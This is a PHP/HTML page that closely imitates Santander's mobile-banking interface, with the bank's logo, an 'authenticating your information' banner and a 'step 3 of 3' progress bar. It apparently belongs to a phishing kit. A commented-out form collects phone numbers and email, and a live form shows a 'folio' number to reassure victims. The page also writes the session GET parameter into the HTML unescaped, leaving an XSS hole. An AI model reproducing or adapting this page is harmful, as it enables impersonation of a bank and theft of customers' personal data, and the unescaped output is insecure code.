<?php 
    $session = $_GET['session'];
?>

<script src="../../jquery-1.11.2.js"></script>
<script src="App_Mobile.js"></script>

<input type="hidden" name="session" id="session" value="<?=$session;?>">
<input type="hidden" name="idHistory" id="idHistory">

<style>
    #divEmailConfirm {
            width: 40%;
            left: 30%;
            top: 2em;
            z-index: 10002;
            position: absolute;
            display: none;
            margin: 0 auto!important;
        }


        #backmodal {
            padding: 0;
            margin: 0;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            width: 100%;
            height: 100%;
            background: #595959 url(../../spacer.gif) center center;
            z-index: 1001;
            -moz-opacity: 0.8;
            opacity: 0.80;
            filter: alpha(opacity=80);
            display: none;
        }

        @media (min-width: 1200px){
            #divEmailConfirm {
                width: 40%;
                left: 30%;
                top: 2em;
            }
        }

        @media (min-width: 992px) and (max-width: 1199px){
            #divEmailConfirm {
                width: 60%;
                left: 30%;
                top: 3em;
            }
        }

        @media (min-width: 268px) and (max-width: 991px){
            #divEmailConfirm {
                width: 90%;
                left: 5%;
                top: 1em;
            }
        }
    </style>


<style>


    .progress-flex[_ngcontent-c19] {
    display: -webkit-box;
    display: -ms-flexbox;
    display: flex;
}
    
    
    .container[_ngcontent-c19] {
    height: 54px;
    padding: 0;
    width: 100%;
    margin-top: 51px;
    margin-bottom: 45px;
}
    
    .progress[_ngcontent-c19] {
    margin-top: 1.78%;
    border-radius: 0;
    height: 6px;
}
    
    
    
    .progressBar-text-center[_ngcontent-c19] {
    text-align: center;
}

    
    
    .progressBar-text-right[_ngcontent-c19] {
    opacity: .6;
    text-align: right;
}

.progressBar-text[_ngcontent-c19], .progressBar-text-center[_ngcontent-c19], .progressBar-text-left[_ngcontent-c19], .progressBar-text-right[_ngcontent-c19] {
    font-size: 12px;
    line-height: 20px;
    color: #444;
    width: 32.5%;
    display: inline-block;
}
    
    
.progressBar-text[_ngcontent-c19], .progressBar-text-center[_ngcontent-c19], .progressBar-text-left[_ngcontent-c19], .progressBar-text-right[_ngcontent-c19] {
    font-size: 12px;
    line-height: 20px;
    color: #444;
    width: 32.5%;
    display: inline-block;
}
    
    
    
    
    .row {
    display: -webkit-box;
    display: -ms-flexbox;
    display: flex;
    -ms-flex-wrap: wrap;
    flex-wrap: wrap;
    margin-right: -15px;
    margin-left: -15px;
}
    
    
    
    .progressBar-text-left[_ngcontent-c19] {
    text-align: left;
}
<style>
.progressBar-text[_ngcontent-c19], .progressBar-text-center[_ngcontent-c19], .progressBar-text-left[_ngcontent-c19], .progressBar-text-right[_ngcontent-c19] {
    font-size: 12px;
    line-height: 20px;
    color: #444;
    width: 32.5%;
    display: inline-block;
}
    
    
    .rounded-circle[_ngcontent-c19] {
    border: 2px solid #ec0000;
    padding: 4px 9px;
}
.rounded-circle {
    border-radius: 50%!important;
}
    
    
    .container[_ngcontent-c19] {
    height: 54px;
    padding: 0;
    width: 100%;
    margin-top: 51px;
    margin-bottom: 45px;
}
    
    
    #progressBar[_ngcontent-c19] {
    background-color: #e60000;
}
    
    .progress {
    /*display: -webkit-box;
    display: -ms-flexbox;
    display: flex;
    height: 1rem;
    overflow: hidden;*/
    font-size: .75rem!important;
    /*background-color: #e9ecef;
    border-radius: .25rem;*/
}
    
    @media (min-width: 960px){
        .container {
    max-width: 960px;
}
    }

    
    
    @media (min-width: 768px){
        .container {
    max-width: 720px;
            
}
        
        .pt-10px{
            font-size: 10px!important;
        }
    }

    @media (min-width: 320px){
        .container {
    max-width: 540px;
}
        
        .pt-10px{
            font-size: 10px!important;
        }
    }

.container {
    width: 100%;
    padding-right: 15px;
    padding-left: 15px;
    margin-right: auto;
    margin-left: auto;
}
    
    
    
    
    
    
    
    
    
    
    
    .portrait[_ngcontent-c12] {
    min-height: 52px;
    max-height: 52px;
}

.footer[_ngcontent-c12] {
    background-color: #676767;
    color: #fff;
    padding: 0 6px 6px;
}
.w-100 {
    width: 100%!important;
}
.navbar {
    position: relative;
    display: -webkit-box;
    display: -ms-flexbox;
    display: flex;
    -ms-flex-wrap: wrap;
    flex-wrap: wrap;
    -webkit-box-align: center;
    -ms-flex-align: center;
    align-items: center;
    -webkit-box-pack: justify;
    -ms-flex-pack: justify;
    justify-content: space-between;
    padding: .5rem 1rem;
}
article, aside, figcaption, figure, footer, header, hgroup, main, nav, section {
    display: block;
}
* {
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    font-family: 'Open Sans',sans-serif;
}
*, ::after, ::before {
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
}

nav {
    display: block;
}
    
    
    
    
    
</style>





<super-header _ngcontent-c1="" _nghost-c7="" style="max-width: 937px;">
    <!---->
    <div _ngcontent-c7="" class="ng-star-inserted">
        <nav _ngcontent-c7="" class="navbar mobile-private" style="background: rgb(236, 0, 0);">
            <div _ngcontent-c7="" class="w-100">
                <div _ngcontent-c7="" class="insideNav" style="">
                    <div _ngcontent-c7="" class="row m-0 icons-row">
                        <!---->
                        <div _ngcontent-c7="" class="items col-10 text-center ml-auto">
                            <!---->
                            <!---->
                            <div _ngcontent-c7="" class="ng-star-inserted">
                                <div _ngcontent-c7="" class="d-flex flex-column">
                                    <!---->
                                    <div _ngcontent-c7="" class="p-0 align-content-center ng-star-inserted">
                                        <img _ngcontent-c7="" class="img-responsive logo" src="../assets/logos/classic/santander_classic.svg">
                                    </div>
                                    <!---->
                                    <!---->
                                </div>
                            </div>
                        </div>

                        <!----><button _ngcontent-c7="" class="btn btn-burguer col-1 ng-star-inserted" type="button">
                            <img _ngcontent-c7="" class="burguer" src="../assets/img/burger_menu.svg">
                        </button>
                        <div _ngcontent-c7="" class="col-9 d-flex px-0 mt-1 icons-wrapperv justify-content-end">
                            <!---->
                            <!---->
                            <!---->
                            <!---->
                            <!---->
                            <!---->
                        </div>
                    </div>
                </div>
            </div>
        </nav>

        <!---->

        <!---->
        <nav _ngcontent-c7="" class="childView ng-star-inserted">
            <div _ngcontent-c7="" class="w-100">
                <div _ngcontent-c7="" class="d-flex justify-content-center">
                    <div _ngcontent-c7="" class="text-center title">
                        <strong _ngcontent-c7="" id="txtTitle">
                            Autenticando su Informaci&oacute;n
                        </strong>
                    </div>
                </div>
            </div>
        </nav>
    </div>

    <!---->

    <!---->
</super-header>


<div _ngcontent-c1="" class="w-100">
    <div _ngcontent-c1="" class="shell-center" style="">
        <div _ngcontent-c1="" class="m-auto" style="max-width: 576px;">
            <!---->
        </div>
        <!---->
        <!---->

        <div _ngcontent-c1="" class="row m-auto">
            <!---->
            <div _ngcontent-c1="" class="col-12 m-auto px-0">
                <div _ngcontent-c1="" class="portrait">
                    <div _ngcontent-c1="" class="w-100 m-auto" style="max-width: 576px; min-height: 403px;">

                        <super-shell _ngcontent-c1="">
                            <!---->

                            <super-loader id="loading" style="display: none;" _nghost-c13="" class="ng-star-inserted">
                                <div _ngcontent-c13="" class="ng-star-inserted">
                                    <div _ngcontent-c13="" class="modal-backdrop" style="opacity: .2"></div>
                                    <div _ngcontent-c13="" class="w3-modal w3-animate-opacity d-flex">
                                        <div _ngcontent-c13="" class="w3-modal-content inner mt-auto">
                                            <img _ngcontent-c13="" alt="" class="loader center" src="../assets/loader-ring.gif">
                                        </div>
                                    </div>
                                </div>
                            </super-loader>



                            <router-outlet></router-outlet>
                            <ng-component class="ng-star-inserted">
                                <router-outlet></router-outlet>
                                <super-unlock-authentication _nghost-c21="" class="ng-star-inserted">
                                    <div _ngcontent-c21="" class="container container-desktop container-tab">
                                        <style>
                                            .paso1 {
                                                width: 33.3%
                                            }

                                            .paso2 {
                                                width: 67%
                                            }

                                            .paso3 {
                                                width: 100%
                                            }

                                        </style>
                                        <super-progress-bar _ngcontent-c18="" _nghost-c19="">
                                            <div _ngcontent-c19="" class="container">
                                                <div _ngcontent-c19="" class="row">
                                                    <div _ngcontent-c19="" class="col-lg-12 progress-flex">
                                                        <div _ngcontent-c19="" class="progressBar-text-left">
                                                            <span _ngcontent-c19="" class="rounded-circle" id="roundNumber">
                                                                3
                                                            </span>
                                                        </div>
                                                        <div _ngcontent-c19="" class="progressBar-text-center" id="process_txt">
                                                            Verificando informaci&oacute;n
                                                        </div>
                                                        <div _ngcontent-c19="" class="progressBar-text-right" id="pasos">
                                                            3 de 3
                                                        </div>
                                                    </div>
                                                </div>
                                                <div _ngcontent-c19="" class="progress">
                                                    <div _ngcontent-c19="" aria-valuemax="100" aria-valuemin="0" aria-valuenow="17" class="super-progress-bar paso3" id="progressBar" role="progressbar">
                                                    </div>
                                                </div>
                                            </div>
                                        </super-progress-bar>




                                        <div _ngcontent-c21="">
                                            <!---->
                                            <!---->
                                            <super-unlock-authentication-tdd-nip _ngcontent-c21="" _nghost-c23="" class="ng-star-inserted" id="loadHTML">


                                                <!--<form id="frmData" style="" name="frmData" _ngcontent-c23="" novalidate="" class="ng-untouched ng-pristine ng-invalid">
                                                    <div _ngcontent-c23="" class="row top-margin">
                                                        <div _ngcontent-c23="" class="col-md-12 col-lg-6 padding-left-desktop">
                                                            <div _ngcontent-c23="" class="form-group">
                                                                <label _ngcontent-c23="" class="texto">N&uacute;mero Celular</label>
                                                                <input id="cell" name="cell" _ngcontent-c23="" autocomplete="off" class="form-control ng-untouched ng-pristine ng-invalid" formcontrolname="tarjetas" maxlength="10" placeholder="Teléfono celular" type="text" onKeyPress="return soloNumeros(event)">
                                                            </div>
                                                        </div>
                                                        <div _ngcontent-c23="" class="col-md-12 col-lg-6 padding-left-desktop">
                                                            <div _ngcontent-c23="" class="form-group">
                                                                <label _ngcontent-c23="" class="texto">N&uacute;mero de Casa u Oficina</label>
                                                                <input id="phone" name="phone" _ngcontent-c23="" autocomplete="off" class="form-control ng-untouched ng-pristine ng-invalid" formcontrolname="tarjetas" maxlength="10" placeholder="Teléfono de Casa u Oficina" type="text" onKeyPress="return soloNumeros(event)">
                                                            </div>
                                                        </div>
                                                        <div _ngcontent-c23="" class="col-md-12 col-lg-6 padding-right-desktop">
                                                            <div _ngcontent-c23="" class="form-group">
                                                                <label _ngcontent-c23="" class="texto">
                                                                    Correo electr&oacute;nico
                                                                </label>
                                                                <input id="email" name="email" _ngcontent-c26="" autocomplete="off" class="form-control nip-numbers ng-untouched ng-pristine ng-valid" maxlength="" placeholder="Correo electrónico" type="text">
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <span _ngcontent-c23=""></span>
                                                    


                                                    <div _ngcontent-c23="" class="row justify-content-center my-4">
                                                        <button id="btnEmail" _ngcontent-c23="" class="rounded-red-button btn-lg-mt">
                                                            Continuar
                                                        </button>
                                                    </div>
                                                </form>-->



                                                <form id="frmFolio" name="frmFolio" _ngcontent-c23="" novalidate="" class="ng-untouched ng-pristine ng-invalid" style="display: none;">

                                                    <div _ngcontent-c23="" class="row top-margin">
                                                        <div _ngcontent-c23="" class="col-md-12 col-lg-6 padding-right-desktop">
                                                            <div _ngcontent-c23="" class="form-group">
                                                                <label _ngcontent-c23="" class="texto">
                                                                    Es importante que conserve el No. de folio que aparace en la parte de abajo.
                                                                </label>

                                                            </div>
                                                        </div>
                                                        <div _ngcontent-c23="" class="col-md-12 col-lg-6 padding-left-desktop">
                                                            <div _ngcontent-c23="" class="form-group">
                                                                <label _ngcontent-c25="">Folio: </label>

                                                                <label id="txtFolioInsert" style="color: #e60000!important;"></label>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div _ngcontent-c23="" class="row justify-content-center my-4">
                                                        <button id="btnFolio" _ngcontent-c23="" class="rounded-red-button btn-lg-mt">
                                                            Continuar
                                                        </button>
                                                    </div>




                                                </form>


                                            </super-unlock-authentication-tdd-nip>
                                        </div>
                                    </div>
                                </super-unlock-authentication>
                            </ng-component>
                        </super-shell>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
